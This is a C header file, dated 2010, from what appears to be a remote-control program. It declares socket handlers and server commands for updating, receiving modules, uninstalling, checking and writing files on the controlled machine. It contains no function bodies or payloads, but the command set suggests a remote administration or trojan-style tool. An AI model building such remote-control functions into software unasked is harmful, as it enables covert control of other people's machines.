/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#ifndef KM_MAIN_EVENT_H_INCLUDED
#define KM_MAIN_EVENT_H_INCLUDED

#include "km_socket.h"

int km_main_connect(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped);
int km_main_parse(int ret, DWORD dwTrans, pio_socket i_socket, LPOVERLAPPED lpoverlapped);

int kms_main_update(pio_socket i_socket, char *buffer, int length);
int kms_main_module(pio_socket i_socket, char *buffer, int length);
int kms_main_recv_module(pio_socket i_socket, char *buffer, int length);
int kms_main_close(pio_socket i_socket, char *buffer, int length);
int kms_main_uninstall(pio_socket i_socket, char *buffer, int length);
int kms_main_check(pio_socket i_socket, char *buffer, int length);

int kms_main_destroy(pio_socket i_socket);

int kms_file_write(char *path,char *buffer,int length);

#endif // KM_MAIN_EVENT_H_INCLUDED
